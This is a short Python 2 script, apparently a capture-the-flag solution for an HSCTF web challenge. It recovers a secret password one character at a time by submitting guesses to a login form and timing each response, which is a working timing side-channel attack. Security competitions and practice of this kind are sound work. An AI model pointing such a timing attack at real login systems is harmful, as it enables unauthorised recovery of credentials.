#!/usr/bin/python2
# imyxh

import mechanize
import time

# init
br = mechanize.Browser()
br.open('https://networked-password.web.chal.hsctf.com/')
payl = 'hsctf{'

while 1:  # one iteration per char
    c = 48  # initial ASCII code

    while 1:  # guess char

        br.select_form(nr=0)
        attempt = payl + chr(c)
        br.form['password'] = attempt
        t0 = time.time()
        br.submit()
        resp = br.response().get_data()
        print('attempted char ' + chr(c) + ' with response time '
              + str(time.time()-t0))

        if c == 125:
            resp = raw_input('select character: ')
            payl += resp
            break

        c += 1

    print("CAUGHT: " + payl)

